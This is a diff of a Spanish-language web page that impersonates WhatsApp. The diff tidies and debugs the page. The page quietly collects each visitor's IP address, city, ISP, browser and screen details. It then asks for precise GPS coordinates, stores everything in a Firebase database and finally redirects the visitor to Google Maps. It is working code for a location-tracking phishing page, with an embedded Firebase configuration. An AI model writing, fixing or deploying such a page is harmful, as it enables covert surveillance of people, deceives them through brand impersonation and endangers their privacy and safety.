@@ -1,322 +1,321 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>whatsApp</title>
-<style>
-.imagen-superior{
-    display:block;
-    width:140px;
-    margin:20px auto;
-    border-radius:15px;
-}
-body{
-    margin:0;
-    padding:20px;
-    font-family:Arial, sans-serif;
-    background: linear-gradient(180deg, #7ED957, #25D366);  
-    min-height:100vh;
-    text-align:center;
-}
-h2{
-    color:#075E54;
-    font-size:32px;
-    margin-bottom:10px;
-}
-p{
-    color:#128C7E;
-    font-size:18px;
-    margin-bottom:20px;
-}
-iframe{
-    width:100%;
-    height:350px;
-    border:none;
-    border-radius:15px;
-    box-shadow:0 5px 15px rgba(0,0,0,.25);
-}
-.modal{
-    display:none;
-    position:fixed;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    background:rgba(0,0,0,.6);
-    justify-content:center;
-    align-items:center;
-    z-index:9999;
-}
-.modal-contenido{
-    background:#fff;
-    width:300px;
-    padding:20px;
-    border-radius:15px;
-    text-align:center;
-    box-shadow:0 5px 15px rgba(0,0,0,.3);
-}
-.modal-contenido h3{
-    color:#075E54;
-    margin-bottom:10px;
-}
-.modal-contenido p{
-    color:#444;
-    margin-bottom:20px;
-}
-.modal-contenido button{
-    background:#25D366;
-    color:#fff;
-    border:none;
-    padding:10px 20px;
-    border-radius:8px;
-    cursor:pointer;
-}
-</style>
-</head>
-<body>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WhatsApp</title>
 
-<img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior">
-
-<h2>WhatsApp obtuvo la ubicación ...</h2>
-
-<p id="estado">Cargando datos de IP...</p>
-
-<iframe src="https://www.google.com/maps?q=Colombia&output=embed"></iframe>
-
-<div id="miAlerta" class="modal">
-    <div class="modal-contenido">
-        <img src="imagenubicacion.jpg" class="imagen-superior" alt="Logo">
-        <h3>Permiso de ubicación</h3>
-        <p id="textoAlerta"></p>
-        <button id="btnAceptar">Aceptar</button>
-    </div>
-</div>
-
-        <script type="module">
-
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
-import {
-    getFirestore,
-    collection,
-    addDoc,
-    updateDoc,
-    doc,
-    serverTimestamp
-} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
-
-const firebaseConfig = {
-    apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
-    authDomain: "proyecto-1-ea0ed.firebaseapp.com",
-    projectId: "proyecto-1-ea0ed",
-    storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
-    messagingSenderId: "440062306942",
-    appId: "1:440062306942:web:74eab86708e22587d7462f"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-const estado = document.getElementById("estado");
-
-let docId = null;
-let datosIP = {};
-let ubicacionObtenida = false;
-let solicitudEnProgreso = false;
-
-const modal = document.getElementById("miAlerta");
-const textoAlerta = document.getElementById("textoAlerta");
-const btnAceptar = document.getElementById("btnAceptar");
-
-function mostrarAlerta(texto) {
-    textoAlerta.textContent = texto;
-    modal.style.display = "flex";
-}
-
-function ocultarAlerta() {
-    modal.style.display = "none";
-}
-
-btnAceptar.addEventListener("click", function () {
-    ocultarAlerta();
-    if (ubicacionObtenida) return;
-    solicitarUbicacion();
-});
-
-
-function agregarBotonRecargar() {
-    if (document.getElementById("btnRecargar")) return;
-    const btnRecargar = document.createElement("button");
-    btnRecargar.id = "btnRecargar";
-    btnRecargar.textContent = "Recargar página";
-    btnRecargar.style.marginLeft = "10px";
-    btnRecargar.style.backgroundColor = "#075E54";
-    btnRecargar.style.color = "#fff";
-    btnRecargar.style.border = "none";
-    btnRecargar.style.padding = "10px 20px";
-    btnRecargar.style.borderRadius = "8px";
-    btnRecargar.style.cursor = "pointer";
-    btnRecargar.addEventListener("click", function() {
-        window.location.reload();
-    });
-    btnAceptar.parentNode.insertBefore(btnRecargar, btnAceptar.nextSibling);
-}
-
-async function obtenerDatosIP() {
-    try {
-        const respuesta = await fetch("https://ipapi.co/json/");
-        if (!respuesta.ok) throw new Error("Error al consultar ipapi");
-        const data = await respuesta.json();
-        return {
-            ip: data.ip || "Desconocido",
-            ciudad: data.city || "Desconocido",
-            region: data.region || "Desconocido",
-            pais: data.country_name || "Desconocido",
-            proveedor: data.org || "Desconocido",
-            zonaHoraria: data.timezone || "Desconocido"
-        };
-    } catch (error) {
-        console.error("Error obteniendo IP:", error);
-        return {
-            ip: "No disponible",
-            ciudad: "No disponible",
-            region: "No disponible",
-            pais: "No disponible",
-            proveedor: "No disponible",
-            zonaHoraria: "No disponible"
-        };
-    }
-}
-
-async function guardarDatosIniciales() {
-    try {
-        const docRef = await addDoc(collection(db, "ubicaciones"), {
-            ...datosIP,
-            userAgent: navigator.userAgent,
-            idioma: navigator.language,
-            plataforma: navigator.platform,
-            anchoPantalla: screen.width,
-            altoPantalla: screen.height,
-            lat: null,
-            lon: null,
-            precision: null,
-            fecha: serverTimestamp(),
-            ubicacion_obtenida: false
-        });
-        docId = docRef.id;
-        console.log("Documento inicial creado ID:", docId);
-        estado.textContent = "✅ Datos de IP guardados. Solicitando ubicación...";
-        return true;
-    } catch 
-        
-        (error) {
-        console.error("Error al guardar datos iniciales:", error);
-        estado.textContent = "⚠️ Error al guardar datos iniciales.";
-        return false;
-    }
-}
-
-async function actualizarConUbicacion(posicion) {
-    if (!docId) return false;
-    try {
-        await updateDoc(doc(db, "ubicaciones", docId), {
-            lat: posicion.coords.latitude,
-            lon: posicion.coords.longitude,
-            precision: posicion.coords.accuracy,
-            ubicacion_obtenida: true,
-            fecha_ubicacion: serverTimestamp()
-        });
-        return true;
-    } catch (error) {
-        console.error("Error al actualizar con ubicación:", error);
-        return false;
-    }
-}
-
-function solicitarUbicacion() { alert("Entró a solicitarUbicacion");
-    if (!navigator.geolocation) {
-        mostrarAlerta("Tu navegador no soporta geolocalización.");
-        return;
-    }
-    if (solicitudEnProgreso || ubicacionObtenida) return;
-    solicitudEnProgreso = true;
-    estado.textContent = "📍 Solicitando permiso de ubicación...";
-
-    navigator.geolocation.getCurrentPosition(
-        async (posicion) => {
-            solicitudEnProgreso = false;
-            ubicacionObtenida = true;
-            estado.textContent = "📍 Ubicación obtenida, actualizando...";
-            const actualizado = await actualizarConUbicacion(posicion);
-            if (actualizado) {
-                estado.textContent = "✅ Información completa guardada. Abriendo Google Maps...";
-                ocultarAlerta();
-                const lat = posicion.coords.latitude;
-                const lon = posicion.coords.longitude;
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
-                }, 2500);
-            } else {
-                estado.textContent = "⚠️ No se pudo actualizar la ubicación.";
-                mostrarAlerta("Error al guardar la ubicación. Intenta de nuevo.");
-            }
-        },
-        (error) => {
-        console.log("Código de error:", error.code);
-         alert("Código de error: " + error.code);    
-            solicitudEnProgreso = false;
-            let mensaje = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    mensaje = "Activa la ubicación en los ajustes del navegador y recarga la página.";
-                    agregarBotonRecargar();
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    mensaje = "No fue posible obtener la ubicación.";
-                    break;
-                case error.TIMEOUT:
-                    mensaje = "La solicitud tardó demasiado.";
-                    break;
-                default:
-                    mensaje = "Ocurrió un error desconocido.";
-            }
-            if (!ubicacionObtenida) {
-                mostrarAlerta(mensaje);
-            }
-            estado.textContent = "⚠️ " + mensaje;
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-}
-
-(async function main() {
-    estado.textContent = "🌐 Obteniendo datos de IP...";
-    datosIP = await obtenerDatosIP();
-    const guardado = await guardarDatosIniciales();
-    if (!guardado) {
-        estado.textContent = "⚠️ Error crítico al guardar. Recarga la página.";
-        return;
-    }
-
-    
-        try {
-            if (permiso.state === 'granted') {
-                solicitarUbicacion();
-                return;
-            } else if (permiso.state === 'denied') {
-                mostrarAlerta("Permiso de ubicación denegado. Actívalo en los ajustes del navegador y recarga la página.");
-                agregarBotonRecargar();
-                estado.textContent = "⚠️ Permiso de ubicación denegado.";
-                return;
-            }
-        } catch (e) {
-            console.warn("No se pudo consultar permisos, se solicitará directamente");
+    <style>
+        .imagen-superior {
+            display: block;
+            width: 140px;
+            margin: 20px auto;
+            border-radius: 15px;
         }
-    
-    solicitarUbicacion();
-    })();
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(180deg, #7ED957, #25D366);
+            min-height: 100vh;
+            text-align: center;
+        }
+        h2 {
+            color: #075E54;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #128C7E;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        iframe {
+            width: 100%;
+            height: 350px;
+            border: none;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.25);
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .modal-contenido {
+            background: #fff;
+            width: 300px;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        .modal-contenido h3 {
+            color: #075E54;
+            margin-bottom: 10px;
+        }
+        .modal-contenido p {
+            color: #444;
+            margin-bottom: 20px;
+        }
+        .modal-contenido button {
+            background: #25D366;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.3s;
+        }
+        .modal-contenido button:hover {
+            background: #1DA851;
+        }
+        #btnRecargar {
+            margin-left: 10px;
+            background-color: #075E54;
+        }
+        #btnRecargar:hover {
+            background-color: #054a42;
+        }
+    </style>
+</head>
 
+<body>
+    <img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior" />
+    <h2>WhatsApp obtuvo la ubicación ...</h2>
+    <p id="estado">Cargando datos de IP...</p>
+    <iframe src="https://www.google.com/maps?q=Colombia&output=embed"></iframe>
 
-</script>    
+    <div id="miAlerta" class="modal">
+        <div class="modal-contenido">
+            <img src="imagenubicacion.jpg" class="imagen-superior" alt="Ubicación" />
+            <h3>Permiso de ubicación</h3>
+            <p id="textoAlerta"></p>
+            <button id="btnAceptar">Aceptar</button>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+        import {
+            getFirestore,
+            collection,
+            addDoc,
+            updateDoc,
+            doc,
+            serverTimestamp
+        } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
+            authDomain: "proyecto-1-ea0ed.firebaseapp.com",
+            projectId: "proyecto-1-ea0ed",
+            storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
+            messagingSenderId: "440062306942",
+            appId: "1:440062306942:web:74eab86708e22587d7462f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const estado = document.getElementById("estado");
+        const modal = document.getElementById("miAlerta");
+        const textoAlerta = document.getElementById("textoAlerta");
+        const btnAceptar = document.getElementById("btnAceptar");
+
+        let docId = null;
+        let datosIP = {};
+        let ubicacionObtenida = false;
+        let solicitudEnProgreso = false;
+
+        function mostrarAlerta(texto) {
+            textoAlerta.textContent = texto;
+            modal.style.display = "flex";
+        }
+
+        function ocultarAlerta() {
+            modal.style.display = "none";
+        }
+
+        btnAceptar.addEventListener("click", function () {
+            ocultarAlerta();
+            if (ubicacionObtenida) return;
+            solicitarUbicacion();
+        });
+
+        function agregarBotonRecargar() {
+            if (document.getElementById("btnRecargar")) return;
+            const btnRecargar = document.createElement("button");
+            btnRecargar.id = "btnRecargar";
+            btnRecargar.textContent = "Recargar página";
+            btnRecargar.addEventListener("click", function () {
+                window.location.reload();
+            });
+            btnAceptar.parentNode.insertBefore(btnRecargar, btnAceptar.nextSibling);
+        }
+
+        async function obtenerDatosIP() {
+            try {
+                const respuesta = await fetch("https://ipapi.co/json/");
+                if (!respuesta.ok) throw new Error("Error al consultar ipapi");
+                const data = await respuesta.json();
+                return {
+                    ip: data.ip || "Desconocido",
+                    ciudad: data.city || "Desconocido",
+                    region: data.region || "Desconocido",
+                    pais: data.country_name || "Desconocido",
+                    proveedor: data.org || "Desconocido",
+                    zonaHoraria: data.timezone || "Desconocido"
+                };
+            } catch (error) {
+                console.error("Error obteniendo IP:", error);
+                return {
+                    ip: "No disponible",
+                    ciudad: "No disponible",
+                    region: "No disponible",
+                    pais: "No disponible",
+                    proveedor: "No disponible",
+                    zonaHoraria: "No disponible"
+                };
+            }
+        }
+
+        async function guardarDatosIniciales() {
+            try {
+                const docRef = await addDoc(collection(db, "ubicaciones"), {
+                    ...datosIP,
+                    userAgent: navigator.userAgent,
+                    idioma: navigator.language,
+                    plataforma: navigator.platform,
+                    anchoPantalla: screen.width,
+                    altoPantalla: screen.height,
+                    lat: null,
+                    lon: null,
+                    precision: null,
+                    fecha: serverTimestamp(),
+                    ubicacion_obtenida: false
+                });
+                docId = docRef.id;
+                console.log("Documento inicial creado ID:", docId);
+                estado.textContent = "✅ Datos de IP guardados. Solicitando ubicación...";
+                return true;
+            } catch (error) {
+                console.error("Error al guardar datos iniciales:", error);
+                estado.textContent = "⚠️ Error al guardar datos iniciales.";
+                return false;
+            }
+        }
+
+        async function actualizarConUbicacion(posicion) {
+            if (!docId) return false;
+            try {
+                await updateDoc(doc(db, "ubicaciones", docId), {
+                    lat: posicion.coords.latitude,
+                    lon: posicion.coords.longitude,
+                    precision: posicion.coords.accuracy,
+                    ubicacion_obtenida: true,
+                    fecha_ubicacion: serverTimestamp()
+                });
+                return true;
+            } catch (error) {
+                console.error("Error al actualizar con ubicación:", error);
+                return false;
+            }
+        }
+
+        function solicitarUbicacion() {
+            if (!navigator.geolocation) {
+                mostrarAlerta("Tu navegador no soporta geolocalización.");
+                return;
+            }
+            if (solicitudEnProgreso || ubicacionObtenida) return;
+            solicitudEnProgreso = true;
+            estado.textContent = "📍 Solicitando permiso de ubicación...";
+
+            navigator.geolocation.getCurrentPosition(
+                async (posicion) => {
+                    solicitudEnProgreso = false;
+                    ubicacionObtenida = true;
+                    estado.textContent = "📍 Ubicación obtenida, actualizando...";
+                    const actualizado = await actualizarConUbicacion(posicion);
+                    if (actualizado) {
+                        estado.textContent = "✅ Información completa guardada. Abriendo Google Maps...";
+                        ocultarAlerta();
+                        const lat = posicion.coords.latitude;
+                        const lon = posicion.coords.longitude;
+                        setTimeout(() => {
+                            window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
+                        }, 2500);
+                    } else {
+                        estado.textContent = "⚠️ No se pudo actualizar la ubicación.";
+                        mostrarAlerta("Error al guardar la ubicación. Intenta de nuevo.");
+                    }
+                },
+                (error) => {
+                    solicitudEnProgreso = false;
+                    let mensaje = "";
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            mensaje = "Activa la ubicación en los ajustes del navegador y recarga la página.";
+                            agregarBotonRecargar();
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            mensaje = "No fue posible obtener la ubicación.";
+                            break;
+                        case error.TIMEOUT:
+                            mensaje = "La solicitud tardó demasiado.";
+                            break;
+                        default:
+                            mensaje = "Ocurrió un error desconocido.";
+                    }
+                    if (!ubicacionObtenida) {
+                        mostrarAlerta(mensaje);
+                    }
+                    estado.textContent = "⚠️ " + mensaje;
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        (async function main() {
+            estado.textContent = "🌐 Obteniendo datos de IP...";
+            datosIP = await obtenerDatosIP();
+
+            const guardado = await guardarDatosIniciales();
+            if (!guardado) {
+                estado.textContent = "⚠️ Error crítico al guardar. Recarga la página.";
+                return;
+            }
+
+            // Verificar permiso con la API de permisos (si existe)
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const permiso = await navigator.permissions.query({ name: 'geolocation' });
+                    if (permiso.state === 'granted') {
+                        solicitarUbicacion();
+                        return;
+                    } else if (permiso.state === 'denied') {
+                        mostrarAlerta("Permiso de ubicación denegado. Actívalo en los ajustes del navegador y recarga la página.");
+                        agregarBotonRecargar();
+                        estado.textContent = "⚠️ Permiso de ubicación denegado.";
+                        return;
+                    }
+                    // Si es 'prompt', seguimos adelante
+                } catch (e) {
+                    console.warn("No se pudo consultar permisos, se solicitará directamente");
+                }
+            }
+
+            solicitarUbicacion();
+        })();
+    </script>
 </body>
 </html>
-            
